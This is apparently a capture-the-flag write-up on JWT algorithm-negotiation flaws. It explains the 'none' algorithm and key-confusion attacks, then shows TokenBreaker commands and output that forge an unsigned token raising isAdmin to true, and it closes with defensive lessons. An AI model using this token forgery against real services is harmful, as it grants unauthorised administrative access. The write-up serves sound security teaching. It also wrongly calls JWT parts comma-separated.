# Algorithm Negotiation

## The Basics

Sometimes a bad implementation or a known vulnerability in an older algorithm can lead to serious trouble, and a good example of this is the SSL's [Poodle](https://www.openssl.org/~bodo/ssl-poodle.pdf) Attack which relies on the negotiation of an old an vulnerable algorithm, in combination with a [Padding Oracle](padding-oracle.nd) Attack.

There are a few good examples on the application of this issue and another one really interesting is related with [JWT's](https://jwt.io/introduction/).

Although JWT is a really nice thing, there are a lot of different things that can go wrong with the implementation.

Lets start by getting a really quick overview of JWTs.

```plaintext
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

This is a really simple jwt, which consist of 3 parts, comma separated:

* Header - Has information like the algorithm being used
* Payload - The actual data
* Signature - A signature to verify JWT

Each of these sections is a json structure encoded with base64url

JWT's are being widely used nowadays as a way to validate sessions.

The important parts to understand here about the jwt are the algorithm and the signature. The algorithm specifies the algorithm used to secure the jwt, while the signature makes sure that the jwt wasn't manipulated by an attacker

According to the JWT [specification](https://tools.ietf.org/html/rfc7519) there are two algorithms that are mandatory and need to be supported on every implementation: **none** and **HS256**.

The first one as the name indicates, is not having an algorithm at all, so no signature is needed. The second one is an HMAC with SHA256.

Depending on how a library is implemented, an attacker can manipulate the algorithm, in order to change it to none, or even from something like RS256 which uses a public key, to an HS256

Auth0 has an awesome blog and resources about attacks on JWT and we definitely recommend you to take some time to read their blog posts, specially the post [Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)

## Solving the challenge

This challenge has a vulnerability where the service parsing the jwt accepts the none algorithm, even when the developer specifies a password. So as long as an attacker sends a token with a none algorithm, the server will accept it.

In the challenge, there is a JWT token stored in localstorage

You can start by using [jwt.io](https://jwt.io/) to decode the token, and understand whats there...

In this case, since we are trying to exploit the algorithm negotiation we are going to use a nice tool called [TokenBreaker](https://github.com/Goron/TokenBreaker).

This tool exploit the two issues mentioned before.

You can download the tool and run it with python3.

```bash
pip install -r requirements.txt
python TheNone.py -t TOKEN_OBTAINED_FROM_LOCALSTORAGE
```

This tool will guide you through the process of changing the token.

Take a look on what you need to do:

```bash
python TheNone.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJBTk9OW
U1PVVNVU0VSIiwiaXNBZG1pbiI6ZmFsc2UsImlhdCI6MTYyNTI1MzgzN30.8-SY5A-4DqMglOurZ6aL7x1A5yD0DS8_34DJYXzZY-g
 ________         _  __
/_  __/ /  ___   / |/ /__  ___  ___
 / / / _ \/ -_) /    / _ \/ _ \/ -_)
/_/ /_//_/\__/ /_/|_/\___/_//_/\__/

[*] Decoded Header value: {"alg":"HS256","typ":"JWT"}
[*] Decoded Payload value: {"sub":"ANONYMOUSUSER","isAdmin":false,"iat":1625253837}
[*] New header with 'alg' > 'none': {"alg":"None","typ":"JWT"}
[<] Modify Header? [y/N]: n
[<] Enter your payload: {"sub":"ANONYMOUSUSER","isAdmin":true,"iat":1625253837}
[+] Successfully encoded Token: .
```

The tool asks you if you want to change the header, which we said no, and then asks you to specify your new payload. As you can see from the decoded value, there is a field called isAdmin that is set to false, so we just need to flip it to true.

And the tool will give you a new token that you need to change in localstorage, refresh the page, and there it is: a new paste in the view, with the flag

## Lesson Learned

* Use a well known and proven JWT library to parse JWT tokens.
* Do not accept JWT tokens with none algorithm
* If you support different algorithms, specify a key for each algorithm
